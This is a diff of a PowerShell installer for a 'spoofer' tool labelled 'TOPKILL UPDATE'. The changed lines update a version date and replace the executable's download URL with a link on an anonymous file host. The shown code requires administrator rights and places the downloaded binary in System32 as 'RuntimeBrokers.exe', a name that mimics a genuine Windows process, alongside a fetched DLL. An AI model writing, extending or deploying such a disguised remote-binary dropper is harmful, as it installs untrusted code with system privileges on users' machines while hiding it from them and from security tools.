@@ -1,7 +1,7 @@
 # -----------------------------
 # Menu Selection
 # -----------------------------
-Write-Host "Hi Member Seanual X Spoofer Welcome to TOPKILL UPDATE | 1/11/2025:"
+Write-Host "Hi Member Seanual X Spoofer Welcome to TOPKILL UPDATE | 9/11/2025:"
 Write-Host "1. Install & Run"
 Write-Host "2. Clean"
 
@@ -22,7 +22,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $system32Path = "$env:windir\System32"
 $exeDestination = Join-Path $system32Path "RuntimeBrokers.exe"
 $dllDestination = Join-Path $system32Path "Guna.UI2.dll"
-$exeUrl = "https://files.catbox.moe/gvvuxw.bin"
+$exeUrl = "https://store-na-phx-4.gofile.io/download/web/2982f45f-63f4-4469-ab36-4d019302c52a/hee.exe"
 $dllUrl = "https://github.com/NAWINNNNNNNNNNNNNNNNNNNNNNNNNNN/WEBSEA1213/raw/refs/heads/main/Guna.UI2.dll"
 
 # -----------------------------
@@ -98,6 +98,7 @@ else {
     Write-Host "Invalid choice (please select 1 or 2)." -ForegroundColor Red
 
 }
+
 
 
 
